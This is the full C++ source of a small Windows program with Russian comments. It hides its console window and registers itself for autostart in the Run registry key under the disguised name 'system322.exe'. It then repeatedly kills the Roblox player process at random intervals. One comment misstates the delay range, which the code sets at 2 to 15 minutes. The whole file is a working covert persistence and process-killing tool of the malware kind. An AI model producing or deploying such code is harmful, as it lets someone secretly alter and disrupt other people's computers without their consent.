#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <random>

// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
// and compile with -DPSAPI_VERSION=1

void KillProcessByName(const TCHAR* targetProcessName) {
    // Получаем список всех процессов
    DWORD processes[1024], cbNeeded, processesCount;

    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        return;
    }

    processesCount = cbNeeded / sizeof(DWORD);

    for (DWORD i = 0; i < processesCount; i++) {
        if (processes[i] != 0) {
            TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);

            if (hProcess != NULL) {
                HMODULE hMod;
                DWORD cbNeededMod;

                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {
                    GetModuleBaseName(hProcess, hMod, szProcessName,
                        sizeof(szProcessName) / sizeof(TCHAR));
                }

                // Проверяем, это ли нужный процесс
                if (_tcscmp(szProcessName, targetProcessName) == 0) {
                    // Закрываем хэндл для чтения
                    CloseHandle(hProcess);

                    // Открываем с правами на завершение
                    hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processes[i]);
                    if (hProcess != NULL) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                    }
                }
                else {
                    CloseHandle(hProcess);
                }
            }
        }
    }
}

// Добавление в автозагрузку
void AddToStartup() {
    HKEY hKey;
    TCHAR szPath[MAX_PATH];

    // Получаем путь к текущему исполняемому файлу
    GetModuleFileName(NULL, szPath, MAX_PATH);

    // Открываем ключ реестра для автозагрузки
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER,
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_SET_VALUE, &hKey);

    if (result == ERROR_SUCCESS) {
        // Добавляем наше приложение в автозагрузку
        RegSetValueEx(hKey, TEXT("system322.exe"), 0, REG_SZ,
            (BYTE*)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));
        RegCloseKey(hKey);
    }
}

int GetRandomDelay() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(120000, 900000); // 2-8 секунд
    return dis(gen);
}

// Скрытие окна
void HideWindow() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}


int main() {

    AddToStartup();
    
    HideWindow();

    while (true) {
        int delay = GetRandomDelay();
        KillProcessByName(TEXT("RobloxPlayerBeta.exe"));
        Sleep(delay);
    }
    return 0;
}